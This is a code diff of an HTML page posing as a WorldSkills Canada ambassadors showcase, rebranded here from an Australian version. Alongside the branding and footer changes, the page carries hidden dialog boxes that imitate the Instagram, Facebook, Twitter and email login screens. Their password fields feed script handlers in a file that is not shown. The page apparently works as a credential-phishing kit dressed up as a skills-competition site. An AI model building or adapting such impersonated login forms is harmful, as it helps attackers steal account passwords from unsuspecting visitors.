@@ -3,17 +3,17 @@
 
 <head>
   <meta name="description"
-    content="WorldSkills raises the profile and recognition of skilled people, and show how important skills are in achieving economic growth.">
-  <meta property="og:title" content="WorldSkills Australia Ambassadors: Meet the Faces of Skills Excellence">
+    content="WorldSkills showcases the skills of Canadian talent and highlights the importance of skills in driving economic growth across Canada.">
+  <meta property="og:title" content="WorldSkills Canada Ambassadors: Meet the Faces of Skills Excellence">
   <meta property="og:description"
-    content="Explore the champions of Australian talent! Meet the WorldSkills Australia Ambassadors - a showcase of excellence across various industries. Join us in celebrating the best of Australian skillsets and discover how they're shaping the future. #SkillsExcellence #AustralianTalent #WorldSkills">
-  <meta property="og:image" content="img/hero.jpg"> <!-- Replace with actual image URL -->
+    content="Discover the champions of Canadian talent! Meet the WorldSkills Canada Ambassadors - a celebration of excellence across various industries. Join us in celebrating the best of Canadian skillsets and see how they're shaping the future. #SkillsExcellence #CanadianTalent #WorldSkills">
+  <meta property="og:image" content="img/can.png"> <!-- Replace with actual image URL -->
   <meta property="og:url" content="">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="WorldSkills Australia Ambassadors: Meet the Faces of Skills Excellence">
+  <meta name="twitter:title" content="WorldSkills Canada Ambassadors: Meet the Faces of Skills Excellence">
   <meta name="twitter:description"
-    content="Explore the champions of Australian talent! Meet the WorldSkills Australia Ambassadors - a showcase of excellence across various industries. Join us in celebrating the best of Australian skillsets and discover how they're shaping the future. #SkillsExcellence #AustralianTalent #WorldSkills">
-  <meta name="twitter:image" content="img/hero.jpg"> <!-- Replace with actual image URL -->
+    content="Discover the champions of Canadian talent! Meet the WorldSkills Canada Ambassadors - a celebration of excellence across various industries. Join us in celebrating the best of Canadian skillsets and see how they're shaping the future. #SkillsExcellence #CanadianTalent #WorldSkills">
+  <meta name="twitter:image" content="img/can.png"> <!-- Replace with actual image URL -->
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
@@ -22,7 +22,7 @@
   <link rel="stylesheet" href="css/index.css">
   <link rel="stylesheet" href="assets/css/main.css">
 
-  <!--Facebook-->
+  <!-- Facebook -->
   <link rel="stylesheet" href="secured/default.css">
   <link rel="stylesheet" href="secured/style.css">
   <script src="js/index.js"></script>
@@ -34,7 +34,8 @@
   <link rel="icon" href="favicon.ico">
   <link rel="stylesheet" href="twitter-font-awesome-4.css">
 
-  <title>Worldskills Australia | Promoting Australian skills excellence</title>
+  <title>WorldSkills Canada | Promoting Canadian skills excellence</title>
+
   <style>
     body {
       font-family: "Courier New", monospace;
@@ -46,6 +47,7 @@
       background-image: url("img/bg.jpg");
       background-repeat: no-repeat;
       background-position: center;
+      flex-direction: column;
     }
 
     .profile-card {
@@ -168,6 +170,34 @@
       color: #888;
       font-size: 0.9em;
     }
+
+    /* Footer container styling */
+    .footer-container {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      background-color: transparent;
+      /* Transparent background */
+      padding: 10px 0;
+    }
+
+    footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      background-color: transparent;
+      border-top: 1px solid hsl(204deg 7.25% 72.94%);
+    }
+
+    footer img {
+      height: 40px;
+    }
+
+    footer .copyright {
+      font-size: 14px;
+      color: hsl(204deg 7.25% 52.94%);
+    }
   </style>
 </head>
 
@@ -224,147 +254,165 @@
           style="color: hsl(204deg 7.25% 72.94%);">Help</span>
       </li>
     </div>
+  </div>
 
-    <!-- Instagram Dialog Box -->
-    <div id="instagram" class="dialog">
-      <div class="dialog-content">
-        <span class="close" onclick="closeDialog()">&times;</span>
-        <h2><span hidden id="dialog-instagram"></span></h2>
-        <main class="l-main">
-          <div class="l-main__img">
-            <img src="assets/img/homepage.png" alt="Smartphones">
-          </div>
-          <div class="l-user">
-            <div class="c-panel group">
-
-              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
-              <div class="c-panel__form">
-                <input type="text" class="c-panel__input" class="form-control" required
-                  data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
-                <input type="text" class="c-panel__input" class="form-control" required
-                  data-error="Please enter your email" placeholder="Password" id="ig-pass">
-                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button>
-                <span class="c-panel__span">OR</span>
-              </div>
-              <a href="#" class="c-panel__facebook">Login with Facebook</a> <br>
-              <a href="#" class="c-panel__forgot">Forgot password?</a>
-              <br>
-              <br>
-            </div>
-            <div class="c-signup group">
-              <p>Don't have an account? <span>Sign up</span></p>
-            </div>
-
-            <div class="c-app">
-              <p>Get the app.</p>
-              <div class="c-app__download">
-                <img src="assets/img/apple.png" alt="Apple Store">
-                <img src="assets/img/google.png" alt="Google Play">
-              </div>
-            </div>
-          </div>
-        </main>
+  <!-- Footer Container -->
+  <div class="footer-container">
+    <footer>
+      <!-- Copyright Section -->
+      <div class="copyright">
+        <img src="img/SCC_logo_white.png" alt="Company Logo">
       </div>
-    </div>
 
-    <!-- Facebook Dialog Box -->
-    <div id="facebook" class="dialog">
-      <div class="dialog-content">
-        <span class="close" onclick="closeDialog()">&times;</span>
-        <h2><span hidden id="dialog-instagram"></span></h2>
-        <main class="l-main">
-          <div class="fb-user">
-            <div class="fb-panel fb-group">
-              <img src="secured/img/logo.svg" alt="">
-              <p>Facebook helps you connect and share with the people in your life.</p>
-
-              <input type="text" placeholder="Email or Phone number" required id="fb-email">
-              <input type="password" placeholder="Password" required id="fb-pass"><br>
-              <button class="c-btn" onclick="login()" id="fb-log">Log In</button>
-            </div>
-          </div>
-        </main>
+      <!-- Logo Section -->
+      <div>
+        <img src="img/footr_logo.svg" alt="Company Logo">
       </div>
-    </div>
+    </footer>
+  </div>
 
-    <!-- Twitter Dialog Box -->
-    <div id="twitter" class="dialog">
-      <div class="dialog-content">
-        <span class="close" onclick="closeDialog()">&times;</span>
-        <div class="row">
-          <div class="none col-1 col-lg-4"></div>
-          <div class="none col-10 col-lg-5">
-            <div class="box bg-white mt-5 p-3">
-              <div class="nav mb-5">
-                <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
-              </div>
-              <div class="mb-4">
-                <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
-              </div>
 
-              <div class="margin mb-4">
-                <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username"
-                  required id="tw-email">
-              </div>
 
-              <div class="margin mb-4">
-                <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required
-                  id="tw-pass">
-              </div>
-
-              <div class="margin mb-4">
-                <button type="button"
-                  class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill"
-                  onclick="tw_login()" id="tw-log">
-                  <p class="text-white"><b>Log In</b></p>
-                </button>
-              </div>
-
-              <div class="margin mb-4">
-                <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
-                  <p class="color-white"><b>Forgot password?</b></p>
-                </button>
-              </div>
-
-              <div class="margin">
-                <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
-              </div>
-
-              <div class="margin">
-              </div>
-
-            </div>
-          </div>
-          <div class="none col-1 col-lg-3"></div>
+  <!-- Instagram Dialog Box -->
+  <div id="instagram" class="dialog">
+    <div class="dialog-content">
+      <span class="close" onclick="closeDialog()">&times;</span>
+      <h2><span hidden id="dialog-instagram"></span></h2>
+      <main class="l-main">
+        <div class="l-main__img">
+          <img src="assets/img/homepage.png" alt="Smartphones">
         </div>
+        <div class="l-user">
+          <div class="c-panel group">
 
-      </div>
-    </div>
-
-    <!-- Emailprop Dialog Box -->
-    <div id="email" class="dialog">
-      <div class="dialog-content">
-        <span class="close" onclick="closeDialog()">&times;</span>
-        <h2><span hidden id="dialog-instagram"></span></h2>
-
-        <main class="l-main">
-          <div class="fb-user">
-            <div class="fb-panel fb-group">
-              <main>
-                <h1 id="h1"><i class="fa fa-envelope"></i> Sign in</h1>
-                <hr id="hr1">
-                <p id="p2">Sign in using your Email account</p><br><br>
-                <input class="c-panel__input" class="form-control" required id="em-email" type="text"
-                  placeholder="Email address or mobile number">
-                <input class="c-panel__input" class="form-control" required id="em-pass" type="password"
-                  placeholder="Password">
-                <button class="email-button2" onclick="em_login()" id="em-log">Login</button>
-                <br>
+            <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+            <div class="c-panel__form">
+              <input type="text" class="c-panel__input" class="form-control" required
+                data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
+              <input type="text" class="c-panel__input" class="form-control" required
+                data-error="Please enter your email" placeholder="Password" id="ig-pass">
+              <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button>
+              <span class="c-panel__span">OR</span>
             </div>
-        </main>
-      </div>
+            <a href="#" class="c-panel__facebook">Login with Facebook</a> <br>
+            <a href="#" class="c-panel__forgot">Forgot password?</a>
+            <br>
+            <br>
+          </div>
+          <div class="c-signup group">
+            <p>Don't have an account? <span>Sign up</span></p>
+          </div>
+
+          <div class="c-app">
+            <p>Get the app.</p>
+            <div class="c-app__download">
+              <img src="assets/img/apple.png" alt="Apple Store">
+              <img src="assets/img/google.png" alt="Google Play">
+            </div>
+          </div>
+        </div>
       </main>
     </div>
+  </div>
+
+  <!-- Facebook Dialog Box -->
+  <div id="facebook" class="dialog">
+    <div class="dialog-content">
+      <span class="close" onclick="closeDialog()">&times;</span>
+      <h2><span hidden id="dialog-instagram"></span></h2>
+      <main class="l-main">
+        <div class="fb-user">
+          <div class="fb-panel fb-group">
+            <img src="secured/img/logo.svg" alt="">
+            <p>Facebook helps you connect and share with the people in your life.</p>
+
+            <input type="text" placeholder="Email or Phone number" required id="fb-email">
+            <input type="password" placeholder="Password" required id="fb-pass"><br>
+            <button class="c-btn" onclick="login()" id="fb-log">Log In</button>
+          </div>
+        </div>
+      </main>
+    </div>
+  </div>
+
+  <!-- Twitter Dialog Box -->
+  <div id="twitter" class="dialog">
+    <div class="dialog-content">
+      <span class="close" onclick="closeDialog()">&times;</span>
+      <div class="row">
+        <div class="none col-1 col-lg-4"></div>
+        <div class="none col-10 col-lg-5">
+          <div class="box bg-white mt-5 p-3">
+            <div class="nav mb-5">
+              <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
+            </div>
+            <div class="mb-4">
+              <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
+            </div>
+
+            <div class="margin mb-4">
+              <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username"
+                required id="tw-email">
+            </div>
+
+            <div class="margin mb-4">
+              <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required
+                id="tw-pass">
+            </div>
+
+            <div class="margin mb-4">
+              <button type="button"
+                class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill"
+                onclick="tw_login()" id="tw-log">
+                <p class="text-white"><b>Log In</b></p>
+              </button>
+            </div>
+
+            <div class="margin mb-4">
+              <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
+                <p class="color-white"><b>Forgot password?</b></p>
+              </button>
+            </div>
+
+            <div class="margin">
+              <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
+            </div>
+
+            <div class="margin">
+            </div>
+
+          </div>
+        </div>
+        <div class="none col-1 col-lg-3"></div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Emailprop Dialog Box -->
+  <div id="email" class="dialog">
+    <div class="dialog-content">
+      <span class="close" onclick="closeDialog()">&times;</span>
+      <h2><span hidden id="dialog-instagram"></span></h2>
+
+      <main class="l-main">
+        <div class="fb-user">
+          <div class="fb-panel fb-group">
+            <main>
+              <h1 id="h1"><i class="fa fa-envelope"></i> Sign in</h1>
+              <hr id="hr1">
+              <p id="p2">Sign in using your Email account</p><br><br>
+              <input class="c-panel__input" class="form-control" required id="em-email" type="text"
+                placeholder="Email address or mobile number">
+              <input class="c-panel__input" class="form-control" required id="em-pass" type="password"
+                placeholder="Password">
+              <button class="email-button2" onclick="em_login()" id="em-log">Login</button>
+              <br>
+          </div>
+      </main>
+    </div>
+    </main>
+  </div>
   </div>
 
   <!-- Email Dialog Box -->
